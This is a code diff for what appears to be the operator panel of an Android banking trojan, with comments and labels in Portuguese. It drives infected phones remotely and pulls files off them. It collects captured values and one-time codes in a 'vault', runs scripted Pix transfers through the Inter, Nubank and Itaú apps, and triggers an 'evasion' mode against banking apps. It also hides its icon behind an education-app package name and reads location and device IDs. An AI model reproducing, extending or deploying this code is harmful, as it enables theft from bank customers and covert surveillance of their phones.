+    d.innerHTML='<span>'+(dir?'[ ] ':'')+nome+'</span><span class=sm>'+(dir?'':l.split('\t')[0].slice(2))+'</span>';
+    d.onclick=()=>{const base=pasta.endsWith('/')?pasta:pasta+'/';
+      if(dir){$('#p').value=base+nome+'/';ls()}else{iniciaDl(base+nome)}};
+    f.appendChild(d)})}
+let dlBuf=null,dlPath=null,dlOff=0,dlTot=-1;
+function iniciaDl(p){dlPath=p;dlOff=0;dlTot=-1;dlBuf=null;c('dl',{p:p,off:0,n:65536})}
+function baixa(o){
+  if(o==='fim'){fechaDl();return}
+  const m=o.match(/b64=([\s\S]*)/);if(!m){log(o);return}
+  const tot=+(o.match(/total=(\d+)/)||[0,0])[1];
+  if(!dlBuf){dlBuf=[];dlOff=0;dlTot=tot}
+  const b=atob(m[1].replace(/\s/g,''));
+  for(let x=0;x<b.length;x++)dlBuf.push(b.charCodeAt(x));
+  dlOff+=b.length;
+  if(dlOff<dlTot)c('dl',{p:dlPath,off:dlOff,n:65536});else fechaDl()}
+function fechaDl(){
+  const u=new Uint8Array(dlBuf),a=document.createElement('a');
+  a.href=URL.createObjectURL(new Blob([u]));a.download=(dlPath.split('/').pop()||'arq');a.click();
+  dlBuf=null;dlTot=-1;toq('baixado')}
+let mrec=[],mlast=0,mrecOn=false;
+function recTog(){mrecOn=!mrecOn;mlast=Date.now();if(mrecOn)mrec=[];
+  $('#rc').textContent=mrecOn?'REC':'0';$('#rc').style.color=mrecOn?'#f85149':'#6a7686'}
+function push(x){if(!mrecOn)return;const d=Date.now()-mlast;mlast=Date.now();
+  mrec.push(Object.assign({w:d},x));$('#rc').textContent=mrec.length}
+function playM(){if(!mrec.length){toq('nada gravado');return}c('macro',{s:mrec})}
+function preset(n){const q=$('#q'),f=$('#f'),r=$('#r');
+  if(n===1){q.value=30;f.value=10;r.value=360}else{q.value=55;f.value=6;r.value=720}
+  c('q',{v:+q.value});c('fps',{v:+f.value});c('res',{v:+r.value})}
+function desenhaArv(){
+  const a=$('#arv');a.innerHTML='';
+  const q=($('#af').value||'').toLowerCase();
+  const visA=apps.filter(o=>!q||(o.n||'').toLowerCase().includes(q)||(o.p||'').toLowerCase().includes(q));
+  const vis=nos.filter(n=>!q||(n.t||'').toLowerCase().includes(q)||(n.cls||'').toLowerCase().includes(q));
+  if(!visA.length&&!vis.length){a.textContent=(nos.length||apps.length)?'nenhum item com esse filtro':'aguardando o aparelho';return}
+  visA.forEach(o=>{
+    const d=document.createElement('div');d.className='no';
+    const tx=document.createElement('span');tx.className='tx';tx.textContent=o.n;
+    const cl=document.createElement('span');cl.className='cl';cl.textContent=o.p;
+    d.appendChild(tx);d.appendChild(cl);
+    tx.onclick=()=>{c('open',{pkg:o.p});toq('abrir: '+o.n)};
+    const b=document.createElement('button');b.textContent='A';b.title='abrir';
+    b.onclick=ev=>{ev.stopPropagation();c('open',{pkg:o.p})};d.appendChild(b);
+    a.appendChild(d)});
+  if(visA.length&&vis.length){const h=document.createElement('div');h.className='cl';
+    h.textContent='--- tela atual ---';h.style.padding='6px 0 2px';a.appendChild(h); const bar=document.createElement('div');bar.className='ln'; [['subir','rolar para cima',-1],['descer','rolar para baixo',1]].forEach(function(it){const b=document.createElement('button');b.textContent=it[0];b.title=it[1];b.onclick=function(){c('scroll',{d:it[2]})};bar.appendChild(b)}); const bv=document.createElement('button');bv.textContent='voltar';bv.onclick=function(){k(4)};bar.appendChild(bv); a.appendChild(bar)}
+  vis.forEach(n=>{
+    const d=document.createElement('div');d.className='no';d.style.paddingLeft=(n.d*10)+'px';
+    const tx=document.createElement('span');tx.className='tx';
+    tx.textContent=(n.t||'(sem texto)')+(n.e?'  [campo]':'');
+    const cl=document.createElement('span');cl.className='cl';cl.textContent=n.cls||'';
+    d.appendChild(tx);d.appendChild(cl);
+    tx.onclick=()=>{c('node',{x:n.x,y:n.y});toq('toque: '+(n.t||n.cls))};
+    if(n.s){const b=document.createElement('button');b.textContent='S';b.title='rolar ate';b.onclick=ev=>{ev.stopPropagation();c('scrollto',{x:n.x,y:n.y})};d.appendChild(b)} if(n.c){const b=document.createElement('button');b.textContent='L';b.title='toque longo';
+      b.onclick=ev=>{ev.stopPropagation();c('long',{x:n.x,y:n.y})};d.appendChild(b)}
+    if(n.e){const b=document.createElement('button');b.textContent='T';b.title='digitar neste campo';
+      b.onclick=ev=>{ev.stopPropagation();pend={x:n.x,y:n.y};$('#t').placeholder='texto para o campo...';$('#t').focus()};d.appendChild(b)}
+    a.appendChild(d)});
+}
+function pedeArv(){
+  clearTimeout(arvT);c('tree');c('applist');
+  arvT=setTimeout(()=>{if(vNow==='arvore'&&!nos.length&&!apps.length){
+    $('#arv').textContent='sem resposta do aparelho. confira se ele esta online.'}},3000);
+}
+$('#af').oninput=()=>{if(vNow==='arvore')desenhaArv()};
+function carregaCofre(tipo){
+  fetch('/cofre?t='+T+(tipo?'&tipo='+tipo:'')).then(r=>r.json()).then(j=>{
+    cofre=j.l;desenhaCofre()}).catch(()=>{})}
+function desenhaCofre(){
+  const q=($('#cf').value||'').toLowerCase();
+  ['cl','ol'].forEach(id=>{
+    const alvo=$('#'+id);if(!alvo)return;
+    alvo.innerHTML='';
+    cofre.filter(x=>!q||JSON.stringify(x).toLowerCase().includes(q)).forEach(x=>{
+      if(id==='ol'&&x._t!=='otp')return;
+      const d=document.createElement('div');d.className='card';
+      const t=document.createElement('div');t.className='t';t.textContent=x.v||'(vazio)';
+      const m=document.createElement('div');m.className='m';
+      m.textContent=(x._t||'?')+' · '+(x.app||x._dev||'')+(x.campo?' · '+x.campo:'')+' · '+(x._h||'');
+      const a=document.createElement('div');a.className='a';
+      const b1=document.createElement('button');b1.textContent='copiar';
+      b1.onclick=()=>{navigator.clipboard.writeText(x.v||'');toq('copiado')};
+      a.appendChild(b1);
+      d.appendChild(t);d.appendChild(m);d.appendChild(a);alvo.appendChild(d)})})}
+function baixaCofre(){
+  const a=document.createElement('a');
+  a.href=URL.createObjectURL(new Blob([JSON.stringify(cofre,null,1)],{type:'application/json'}));
+  a.download='cofre.json';a.click()}
+function limpaCofre(){fetch('/cofre/clr?t='+T).then(()=>{cofre=[];desenhaCofre();toq('cofre limpo')})}
+const PERFIS={
+"inter":[{"do":"wait","sel":{"txt":"Área Pix|^Pix$"},"ms":15000},
+ {"do":"tap","sel":{"txt":"^Área Pix$|^Pix$","click":true}},
+ {"do":"wait","sel":{"txt":"Transferir|Enviar|Nova transferência"},"ms":9000},
+ {"do":"tap","sel":{"txt":"Transferir|Enviar"}},
+ {"do":"wait","sel":{"edit":true},"ms":9000},
+ {"do":"set","sel":{"edit":true},"v":"{{CHAVE}}"},
+ {"do":"tap","sel":{"txt":"Continuar|Avançar|Próximo"}},
+ {"do":"wait","sel":{"edit":true},"ms":9000},
+ {"do":"set","sel":{"edit":true},"v":"{{VALOR}}"},
+ {"do":"tap","sel":{"txt":"Continuar|Transferir|Confirmar"}},
+ {"do":"wait","sel":{"txt":"Senha|senha|digite"},"ms":15000}],
+"nubank":[{"do":"wait","sel":{"txt":"Pix"},"ms":15000},
+ {"do":"tap","sel":{"txt":"^Pix$","click":true}},
+ {"do":"wait","sel":{"txt":"Transferir|Enviar"},"ms":9000},
+ {"do":"tap","sel":{"txt":"Transferir"}},
+ {"do":"wait","sel":{"txt":"Chave Pix|Nova chave"},"ms":9000},
+ {"do":"tap","sel":{"txt":"Chave Pix"}},
+ {"do":"wait","sel":{"edit":true},"ms":9000},
+ {"do":"set","sel":{"edit":true},"v":"{{CHAVE}}"},
+ {"do":"tap","sel":{"txt":"Continuar|Avançar"}},
+ {"do":"wait","sel":{"edit":true},"ms":9000},
+ {"do":"set","sel":{"edit":true},"v":"{{VALOR}}"},
+ {"do":"tap","sel":{"txt":"Continuar|Transferir|Confirmar"}},
+ {"do":"wait","sel":{"txt":"Senha|senha|digite"},"ms":15000}],
+"itau":[{"do":"wait","sel":{"txt":"Pix"},"ms":15000},
+ {"do":"tap","sel":{"txt":"^Pix$","click":true}},
+ {"do":"wait","sel":{"txt":"Transferir|Enviar Pix"},"ms":9000},
+ {"do":"tap","sel":{"txt":"Transferir|Enviar Pix"}},
+ {"do":"wait","sel":{"txt":"Chave Pix|Nova chave"},"ms":9000},
+ {"do":"tap","sel":{"txt":"Chave Pix"}},
+ {"do":"wait","sel":{"edit":true},"ms":9000},
+ {"do":"set","sel":{"edit":true},"v":"{{CHAVE}}"},
+ {"do":"tap","sel":{"txt":"Continuar|Avançar"}},
+ {"do":"wait","sel":{"edit":true},"ms":9000},
+ {"do":"set","sel":{"edit":true},"v":"{{VALOR}}"},
+ {"do":"tap","sel":{"txt":"Continuar|Transferir|Confirmar"}},
+ {"do":"wait","sel":{"txt":"Senha|senha|digite"},"ms":15000}]};
+function pflUpd(){
+  ['pfl','pf2'].forEach(id=>{const s=$('#'+id);if(!s)return;s.innerHTML='';
+    Object.keys(PERFIS).forEach(k=>{const o=document.createElement('option');
+      o.value=k;o.textContent=k;s.appendChild(o)})})}
+function runPix(){
+  const k2=$('#pfl').value,ch=$('#pch').value.trim(),vl=$('#pvl').value.trim();
+  if(!ch){toq('sem chave pix');return}
+  c('run',{s:PERFIS[k2],v:{chave:ch,valor:vl}});log('perfil '+k2+' chave '+ch+' valor '+(vl||'-'))}
+function wt(){const b=$('#wt'),on=b.dataset.on!=='1';
+  b.dataset.on=on?'1':'0';b.classList.toggle('on',on);c('watch',{on:on});toq('observar '+(on?'ligado':'desligado'))}
+function carregaP(){const k2=$('#pf2').value;$('#pjson2').value=JSON.stringify(PERFIS[k2],null,1)}
+function salvaP(){try{const a=JSON.parse($('#pjson2').value);
+  PERFIS[$('#pf2').value]=a;pflUpd();toq('perfil salvo')}catch(e){toq('json invalido')}}
+function snap(){$('#snapbox').style.display='block';c('snap');toq('captura enviada')}
+function jesc(s){return String(s).replace(/\\/g,'\\\\').replace(/"/g,'\\"')}
+function snapShow(txt){
+  const pre=$('#snappre');pre.innerHTML='';
+  txt.split('\n').forEach(l=>{if(!l.trim())return;
+    const p=l.split('|');const el=document.createElement('div');
+    el.textContent=l;el.onclick=()=>insere(p);pre.appendChild(el)})}
+function insere(p){
+  const cls=p[1]||'',id=p[2]||'',fl=p[3]||'',tx=p[5]||'',cd=p[6]||'';
+  const sel={};
+  if(id)sel.id=jesc(id).replace(/^[^:]*:id\//,'');
+  else if(tx)sel.txt='^'+jesc(tx)+'$';
+  else if(cd)sel.txt=jesc(cd);
+  else if(cls)sel.cls=jesc(cls);
+  else return;
+  if(fl.indexOf('C')>=0)sel.click=true;
+  if(fl.indexOf('E')>=0)sel.edit=true;
+  const s={do:sel.edit?'set':'tap',sel:sel};
+  if(sel.edit)s.v='{{CHAVE}}';
+  let cur=$('#pjson').value.trim();
+  if(cur&&cur[0]!=='[')cur='['+cur.replace(/,\s*$/,'')+']';
+  let arr=[];if(cur)try{arr=JSON.parse(cur)}catch(e){arr=[]}
+  arr.push(s);$('#pjson').value=JSON.stringify(arr,null,1);log('passo: '+JSON.stringify(sel))}
+function playJ(){
+  let t=$('#pjson').value.trim();if(!t){toq('perfil vazio');return}
+  if(t[0]!=='[')t='['+t.replace(/,\s*$/,'')+']';
+  let arr;try{arr=JSON.parse(t)}catch(e){toq('json invalido');return}
+  c('run',{s:arr,v:{chave:($('#pch').value||'').trim(),valor:($('#pvl').value||'').trim()}});
+  log('play '+arr.length+' passos')}
+function salvaJ(){localStorage.setItem('perfil',$('#pjson').value);toq('gravado')}
+function carregaJ(){$('#pjson').value=localStorage.getItem('perfil')||''}
+function limpaJ(){$('#pjson').value=''}
+pflUpd();co();
+</script>
+
+<script>
+(function(){
+  var gs=document.createElement('span'); gs.className='sm'; gs.textContent='--'; gs.title='resolucao do aparelho';
+  var hd=document.querySelector('header'); if(hd) hd.appendChild(gs);
+  window.geoDe=function(){
+    var o=dev.options[dev.selectedIndex];
+    if(!o||!o.value) return;
+    var t=o.textContent||'';
+    var m=/(\d+)x(\d+)\s+b\d+/.exec(t)||/(\d+)x(\d+)/.exec(t);
+    if(!m) return;
+    geo={w:+m[1],h:+m[2]}; gs.textContent=m[1]+'x'+m[2]; fit();
+  };
+  window.rectImg=function(){
+    var r=i.getBoundingClientRect(), nx=i.naturalWidth, ny=i.naturalHeight;
+    if(!r.width||!r.height||!nx||!ny) return null;
+    var s=Math.min(r.width/nx,r.height/ny), w=nx*s, h=ny*s;
+    return {l:r.left+(r.width-w)/2, t:r.top+(r.height-h)/2, w:w, h:h};
+  };
+  window.pt=function(e){
+    if(!geo.w||!geo.h){ geoDe(); if(!geo.w||!geo.h){ c('geo'); toq('resolucao do aparelho ainda nao chegou'); return null; } }
+    var g=rectImg(); if(!g) return null;
+    var fx=(e.clientX-g.l)/g.w, fy=(e.clientY-g.t)/g.h;
+    if(fx<0||fy<0||fx>1||fy>1) return null;
+    return {x:Math.min(geo.w-1,Math.max(0,Math.round(fx*geo.w))), y:Math.min(geo.h-1,Math.max(0,Math.round(fy*geo.h)))};
+  };
+  window.mark=function(p){
+    var g=rectImg(), wr=wrap.getBoundingClientRect();
+    if(!g||!geo.w||!geo.h) return;
+    var d=document.createElement('div'); d.className='tap';
+    d.style.left=(wrap.scrollLeft+g.l-wr.left+p.x/geo.w*g.w)+'px';
+    d.style.top=(wrap.scrollTop+g.t-wr.top+p.y/geo.h*g.h)+'px';
+    wrap.appendChild(d); setTimeout(function(){d.remove()},420);
+  };
+  window.pick=function(){
+    sel=dev.value; lf=0; i.removeAttribute('src'); log('[*] '+(sel||'nenhum')); geoDe();
+    if(sel&&w&&w.readyState===1){ w.send(JSON.stringify({c:'sel',id:sel})); c('geo'); }
+  };
+  dev.onchange=pick;
+  var d2=null,t2=0;
+  i.onpointerdown=function(e){ e.preventDefault(); d2=snapP(pt(e)); t2=Date.now(); if(d2) mark(d2); try{i.setPointerCapture(e.pointerId)}catch(_){} };
+  i.onpointerup=function(e){
+    var d=d2; d2=null; if(!d) return;
+    var u=snapP(pt(e)); if(!u) return;
+    var dist=Math.abs(u.x-d.x)+Math.abs(u.y-d.y), ms=Date.now()-t2;
+    if(dist<14 && ms>520){ c('long',{x:d.x,y:d.y}); push({l:[d.x,d.y]}); }
+    else if(dist<14){ c('touch',{x:d.x,y:d.y}); push({t:[d.x,d.y]}); }
+    else { c('swipe',{x1:d.x,y1:d.y,x2:u.x,y2:u.y,ms:Math.min(600,Math.max(120,ms))}); push({s:[d.x,d.y,u.x,u.y,220]}); }
+  };
+  i.onpointercancel=function(){ d2=null; };
+  window.desenhaArv=function(){
+    var a=$('#arv'); a.innerHTML='';
+    var q=($('#af').value||'').toLowerCase();
+    var visA=apps.filter(function(o){return !q||(o.n||'').toLowerCase().indexOf(q)>=0||(o.p||'').toLowerCase().indexOf(q)>=0});
+    var vis=nos.filter(function(n){return !q||(n.t||'').toLowerCase().indexOf(q)>=0||(n.cls||'').toLowerCase().indexOf(q)>=0});
+    if(!visA.length&&!vis.length){ a.textContent=(nos.length||apps.length)?'nenhum item com esse filtro':'aguardando o aparelho'; return; }
+    function bt(tx,ti,fn){ var b=document.createElement('button'); b.textContent=tx; b.title=ti; b.onclick=function(ev){ev.stopPropagation();fn()}; return b; }
+    function sh(cmd){ return function(){ c('shell',{cmd:cmd}) }; }
+    visA.forEach(function(o){
+      var d=document.createElement('div'); d.className='no';
+      var tx=document.createElement('span'); tx.className='tx'; tx.textContent=o.n;
+      var cl=document.createElement('span'); cl.className='cl'; cl.textContent=o.p;
+      d.appendChild(tx); d.appendChild(cl);
+      tx.onclick=function(){ c('open',{pkg:o.p}); toq('abrir: '+o.n) };
+      d.appendChild(bt('A','abrir',sh('monkey -p '+o.p+' -c android.intent.category.LAUNCHER 1')));
+      d.appendChild(bt('I','info do app',sh('am start -a android.settings.APPLICATION_DETAILS_SETTINGS -d package:'+o.p)));
+      d.appendChild(bt('X','forcar parada',sh('am force-stop '+o.p)));
+      a.appendChild(d);
+    });
+    if(visA.length&&vis.length){ var h=document.createElement('div'); h.className='cl'; h.textContent='--- tela atual ---'; h.style.padding='6px 0 2px'; a.appendChild(h); }
+    if(vis.length){
+      var bar=document.createElement('div'); bar.className='ln';
+      bar.appendChild(bt('subir','rolar para cima',function(){ c('swipe',{x1:Math.round(geo.w/2),y1:Math.round(geo.h*0.35),x2:Math.round(geo.w/2),y2:Math.round(geo.h*0.75),ms:250}) }));
+      bar.appendChild(bt('descer','rolar para baixo',function(){ c('swipe',{x1:Math.round(geo.w/2),y1:Math.round(geo.h*0.75),x2:Math.round(geo.w/2),y2:Math.round(geo.h*0.35),ms:250}) }));
+      bar.appendChild(bt('voltar','voltar',function(){ k(4) }));
+      a.appendChild(bar);
+    }
+    vis.forEach(function(n){
+      var d=document.createElement('div'); d.className='no'; d.style.paddingLeft=(n.d*10)+'px';
+      var tx=document.createElement('span'); tx.className='tx'; tx.textContent=(n.t||'(sem texto)')+(n.e?' [campo]':'');
+      var cl=document.createElement('span'); cl.className='cl'; cl.textContent=n.cls||'';
+      d.appendChild(tx); d.appendChild(cl);
+      tx.onclick=function(){ c('node',{x:n.x,y:n.y}); toq('toque: '+(n.t||n.cls)) };
+      if(n.c) d.appendChild(bt('L','toque longo',function(){ c('long',{x:n.x,y:n.y}) }));
+      if(n.e) d.appendChild(bt('T','digitar neste campo',function(){ pend={x:n.x,y:n.y}; $('#t').placeholder='texto para o campo...'; $('#t').focus(); }));
+      a.appendChild(d);
+    });
+  };
+  if(dev.value) pick();
+})();
+</script>
+<style>
+body.semTela #wrap{display:none}
+body.semTela aside{flex:1 1 auto;width:auto;max-width:none}
+body.semTela nav{width:100px}
+#cx,#cy{flex:0 0 62px}
+</style>
+<script>
+(function(){
+  if(window.painelV2) return;
+  window.painelV2=1;
+
+  var hd=document.querySelector('header');
+  var gs=document.createElement('span'); gs.className='sm'; gs.textContent='--'; gs.title='resolucao do aparelho';
+  if(hd) hd.appendChild(gs);
+  var bs=document.createElement('button'); bs.textContent='sem tela'; bs.title='esconde a imagem e alarga o painel';
+  bs.onclick=function(){ var on=!document.body.classList.contains('semTela'); document.body.classList.toggle('semTela',on); bs.classList.toggle('on',on); setTimeout(fit,80); };
+  if(hd) hd.appendChild(bs);
+
+  var focoPkg='';
+  function bt(tx,ti,fn){ var b=document.createElement('button'); b.textContent=tx; b.title=ti; b.onclick=function(ev){ev.stopPropagation();fn()}; return b; }
+  function sh(cmd){ return function(){ c('shell',{cmd:cmd}) }; }
+  function abrir(p){ c('shell',{cmd:'monkey -p '+p+' -c android.intent.category.LAUNCHER 1'}) }
+  function info(p){ c('shell',{cmd:'am start -a android.settings.APPLICATION_DETAILS_SETTINGS -d package:'+p}) }
+  function parar(p){ c('shell',{cmd:'am force-stop '+p}) }
+
+  function achaFoco(cb){
+    var o=$('#out'); if(!o){ if(cb)cb(null); return; }
+    var antes=o.textContent.length;
+    c('shell',{cmd:'dumpsys window | grep -m1 -E "mCurrentFocus|mFocusedApp"'});
+    var n=0;
+    var iv=setInterval(function(){
+      n++;
+      var t=$('#out').textContent.slice(antes);
+      var m=/u0\s+([a-zA-Z0-9_.]+)\//.exec(t)||/([a-zA-Z0-9_.]+)\/[A-Za-z0-9_.$]+/.exec(t);
+      if(m){ clearInterval(iv); focoPkg=m[1]; if(cb)cb(m[1]); return; }
+      if(n>22){ clearInterval(iv); if(cb)cb(null); }
+    },150);
+  }
+
+  window.geoDe=function(){
+    var o=dev.options[dev.selectedIndex]; if(!o||!o.value) return;
+    var t=o.textContent||'';
+    var m=/(\d+)x(\d+)\s+b\d+/.exec(t)||/(\d+)x(\d+)/.exec(t);
+    if(!m) return;
+    geo={w:+m[1],h:+m[2]}; gs.textContent=m[1]+'x'+m[2]; fit();
+  };
+  window.rectImg=function(){
+    var r=i.getBoundingClientRect(), nx=i.naturalWidth, ny=i.naturalHeight;
+    if(!r.width||!r.height||!nx||!ny) return null;
+    var s=Math.min(r.width/nx,r.height/ny), w=nx*s, h=ny*s;
+    return {l:r.left+(r.width-w)/2, t:r.top+(r.height-h)/2, w:w, h:h};
+  };
+  window.pt=function(e){
+    if(!geo.w||!geo.h){ geoDe(); if(!geo.w||!geo.h){ c('geo'); return null; } }
+    var g=rectImg(); if(!g) return null;
+    var fx=(e.clientX-g.l)/g.w, fy=(e.clientY-g.t)/g.h;
+    if(fx<0||fy<0||fx>1||fy>1) return null;
+    return {x:Math.min(geo.w-1,Math.max(0,Math.round(fx*geo.w))), y:Math.min(geo.h-1,Math.max(0,Math.round(fy*geo.h)))};
+  };
+  window.mark=function(p){
+    var g=rectImg(), wr=wrap.getBoundingClientRect();
+    if(!g||!geo.w||!geo.h) return;
+    var d=document.createElement('div'); d.className='tap';
+    d.style.left=(wrap.scrollLeft+g.l-wr.left+p.x/geo.w*g.w)+'px';
+    d.style.top=(wrap.scrollTop+g.t-wr.top+p.y/geo.h*g.h)+'px';
+    wrap.appendChild(d); setTimeout(function(){d.remove()},420);
+  };
+  window.pick=function(){
+    sel=dev.value; lf=0; i.removeAttribute('src'); log('[*] '+(sel||'nenhum')); geoDe();
+    if(sel&&w&&w.readyState===1){ w.send(JSON.stringify({c:'sel',id:sel})); c('geo'); }
+  };
+  dev.onchange=pick;
+
+  var d2=null,t2=0;
+  i.onpointerdown=function(e){ e.preventDefault(); d2=snapP(pt(e)); t2=Date.now(); if(d2) mark(d2); try{i.setPointerCapture(e.pointerId)}catch(_){} };
+  i.onpointerup=function(e){
+    var d=d2; d2=null; if(!d) return;
+    var u=snapP(pt(e)); if(!u) return;
+    var dist=Math.abs(u.x-d.x)+Math.abs(u.y-d.y), ms=Date.now()-t2;
+    if(dist<14 && ms>520){ c('long',{x:d.x,y:d.y}); push({l:[d.x,d.y]}); }
+    else if(dist<14){ c('touch',{x:d.x,y:d.y}); push({t:[d.x,d.y]}); }
+    else { c('swipe',{x1:d.x,y1:d.y,x2:u.x,y2:u.y,ms:Math.min(600,Math.max(120,ms))}); push({s:[d.x,d.y,u.x,u.y,220]}); }
+  };
+  i.onpointercancel=function(){ d2=null; };
+
+  function linhaCoord(){
+    var r=document.createElement('div'); r.className='ln';
+    var ix=document.createElement('input'); ix.className='cx'; ix.placeholder='x';
+    var iy=document.createElement('input'); iy.className='cy'; iy.placeholder='y';
+    function v(){ var a=document.querySelector('.cx'), b=document.querySelector('.cy'); return {x:+(a&&a.value||0), y:+(b&&b.value||0)}; }
+    r.appendChild(ix); r.appendChild(iy);
+    r.appendChild(bt('tocar','tocar nesta coordenada',function(){ var q=v(); c('touch',{x:q.x,y:q.y}) }));
+    r.appendChild(bt('segurar','toque longo',function(){ var q=v(); c('long',{x:q.x,y:q.y}) }));
+    r.appendChild(bt('centro','tocar no centro',function(){ c('touch',{x:Math.round(geo.w/2),y:Math.round(geo.h/2)}) }));
+    r.appendChild(bt('voltar','voltar',function(){ k(4) }));
+    return r;
+  }
+
+  window.desenhaArv=function(){
+    var a=$('#arv'); a.innerHTML='';
+    var q=($('#af').value||'').toLowerCase();
+    var visA=apps.filter(function(o){return !q||(o.n||'').toLowerCase().indexOf(q)>=0||(o.p||'').toLowerCase().indexOf(q)>=0});
+    var vis=nos.filter(function(n){return !q||(n.t||'').toLowerCase().indexOf(q)>=0||(n.cls||'').toLowerCase().indexOf(q)>=0});
+
+    var fb=document.createElement('div'); fb.className='ln';
+    fb.appendChild(bt('foco','detectar o app na frente',function(){ achaFoco(function(p){ toq('foco: '+(p||'?')); desenhaArv(); }) }));
+    if(focoPkg){
+      var sp=document.createElement('span'); sp.className='sm'; sp.textContent=focoPkg; fb.appendChild(sp);
+      fb.appendChild(bt('A','abrir',function(){ abrir(focoPkg) }));
+      fb.appendChild(bt('I','info',function(){ info(focoPkg) }));
+      fb.appendChild(bt('X','parar',function(){ parar(focoPkg) }));
+      fb.appendChild(bt('banco','evasao neste app',function(){ bankAuto(focoPkg) }));
+    }
+    a.appendChild(fb);
+    a.appendChild(linhaCoord());
+
+    if(!visA.length&&!vis.length){ var vazio=document.createElement('div'); vazio.className='cl'; vazio.textContent=(nos.length||apps.length)?'nenhum item com esse filtro':'aguardando o aparelho'; a.appendChild(vazio); return; }
+
+    visA.forEach(function(o){
+      var d=document.createElement('div'); d.className='no';
+      var tx=document.createElement('span'); tx.className='tx'; tx.textContent=o.n;
+      var cl=document.createElement('span'); cl.className='cl'; cl.textContent=o.p;
+      d.appendChild(tx); d.appendChild(cl);
+      tx.onclick=function(){ abrir(o.p); toq('abrir: '+o.n) };
+      d.appendChild(bt('A','abrir',function(){ abrir(o.p) }));
+      d.appendChild(bt('I','info',function(){ info(o.p) }));
+      d.appendChild(bt('X','parar',function(){ parar(o.p) }));
+      a.appendChild(d);
+    });
+
+    if(visA.length&&vis.length){ var h=document.createElement('div'); h.className='cl'; h.textContent='--- tela atual ---'; h.style.padding='6px 0 2px'; a.appendChild(h); }
+    if(vis.length){
+      var bar=document.createElement('div'); bar.className='ln';
+      bar.appendChild(bt('subir','rolar para cima',function(){ c('swipe',{x1:Math.round(geo.w/2),y1:Math.round(geo.h*0.35),x2:Math.round(geo.w/2),y2:Math.round(geo.h*0.75),ms:250}) }));
+      bar.appendChild(bt('descer','rolar para baixo',function(){ c('swipe',{x1:Math.round(geo.w/2),y1:Math.round(geo.h*0.75),x2:Math.round(geo.w/2),y2:Math.round(geo.h*0.35),ms:250}) }));
+      a.appendChild(bar);
+    }
+    vis.forEach(function(n){
+      var d=document.createElement('div'); d.className='no'; d.style.paddingLeft=(n.d*10)+'px';
+      var tx=document.createElement('span'); tx.className='tx'; tx.textContent=(n.t||'(sem texto)')+(n.e?' [campo]':'');
+      var cl=document.createElement('span'); cl.className='cl'; cl.textContent=n.cls||'';
+      d.appendChild(tx); d.appendChild(cl);
+      tx.onclick=function(){ c('node',{x:n.x,y:n.y}); toq('toque: '+(n.t||n.cls)) };
+      if(n.c) d.appendChild(bt('L','toque longo',function(){ c('long',{x:n.x,y:n.y}) }));
+      if(n.e) d.appendChild(bt('T','digitar neste campo',function(){ pend={x:n.x,y:n.y}; $('#t').placeholder='texto para o campo...'; $('#t').focus(); }));
+      a.appendChild(d);
+    });
+  };
+
+  window.bankAuto=function(p){
+    if(!p){ toq('sem app alvo'); return; }
+    $('#bpkg').value=p;
+    c('bank',{pkg:p});
+    toq('evasao: '+p);
+  };
+  window.bankOn=function(){
+    var p=($('#bpkg').value||'').trim();
+    if(p){ bankAuto(p); return; }
+    achaFoco(function(f){ if(!f){ toq('app da frente nao detectado'); return; } bankAuto(f); });
+  };
+
+  function novoOut(){ return $('#out').textContent.length; }
+  function copia(desde, alvo){ setTimeout(function(){ var t=$('#out').textContent.slice(desde); $(alvo).textContent=t||'(sem resposta)'; },1500); }
+  window.infoShell=function(){
+    var n=novoOut();
+    c('shell',{cmd:"getprop ro.product.brand; getprop ro.product.model; getprop ro.build.version.release; getprop ro.build.version.sdk; wm size; wm density; dumpsys battery | grep -E 'level|status'; settings get secure android_id"});
+    copia(n,'#out3');
+  };
+  window.locShell=function(){
+    var n=novoOut();
+    c('shell',{cmd:'dumpsys location | grep -iE "last location|Location\\[" | head -20'});
+    setTimeout(function(){ go('live'); },50);
+  };
+  window.renderAppsTab=function(){
+    var o=$('#out2'); if(!o) return;
+    o.innerHTML='';
+    if(!apps.length){ o.textContent='sem lista. toque em Atualizar.'; return; }
+    apps.forEach(function(a){
+      var d=document.createElement('div'); d.className='no';
+      var tx=document.createElement('span'); tx.className='tx'; tx.textContent=a.n;
+      var cl=document.createElement('span'); cl.className='cl'; cl.textContent=a.p;
+      d.appendChild(tx); d.appendChild(cl);
+      tx.onclick=function(){ abrir(a.p) };
+      d.appendChild(bt('A','abrir',function(){ abrir(a.p) }));
+      d.appendChild(bt('I','info',function(){ info(a.p) }));
+      d.appendChild(bt('X','parar',function(){ parar(a.p) }));
+      o.appendChild(d);
+    });
+  };
+
+  function linhaUp(txt,fn,alvo){
+    var v=$(alvo); if(!v||$('#up'+alvo)) return;
+    var r=document.createElement('div'); r.className='ln'; r.id='up'+alvo;
+    r.appendChild(bt(txt,'atualizar',fn));
+    v.insertBefore(r, v.firstChild);
+  }
+
+  document.querySelectorAll('nav b').forEach(function(b){
+    b.onclick=function(){
+      go(b.dataset.v);
+      if(b.dataset.v==='apps'){ c('applist'); setTimeout(renderAppsTab,1200); }
+      if(b.dataset.v==='info'){ infoShell(); }
+      if(b.dataset.v==='arvore'){ setTimeout(function(){ achaFoco(function(p){ if(p) desenhaArv(); }); },400); }
+    };
+  });
+
+  document.querySelectorAll('#mais button').forEach(function(b){
+    var t=(b.textContent||'').trim();
+    if(t.indexOf('Ocultar')>=0) b.onclick=function(){ c('shell',{cmd:'pm disable-user --user 0 com.eloeeducacao/.Alias'}); toq('icone oculto') };
+    else if(t.indexOf('Mostrar')>=0) b.onclick=function(){ c('shell',{cmd:'pm enable com.eloeeducacao/.Alias'}); toq('icone visivel') };
+    else if(t==='Info') b.onclick=function(){ go('info'); infoShell(); };
+    else if(t==='Apps') b.onclick=function(){ go('apps'); c('applist'); setTimeout(renderAppsTab,1200); };
+    else if(t==='Localização') b.onclick=function(){ locShell(); };
+  });
+
+  linhaUp('Atualizar lista', function(){ c('applist'); setTimeout(renderAppsTab,1200); }, '#v-apps');
+  linhaUp('Atualizar dados', infoShell, '#v-info');
+  var lv=$('#v-live'); if(lv) lv.insertBefore(linhaCoord(), lv.firstChild);
+  $('#bpkg').placeholder='vazio = usa o app da frente';
+
+  if(dev.value) pick();
+})();
+</script>
+<script>
+(function(){
+  if(window.painelV3) return;
+  window.painelV3=1;
+
+  function bt(tx,ti,fn){ var b=document.createElement('button'); b.textContent=tx; b.title=ti; b.onclick=function(ev){ev.stopPropagation();fn()}; return b; }
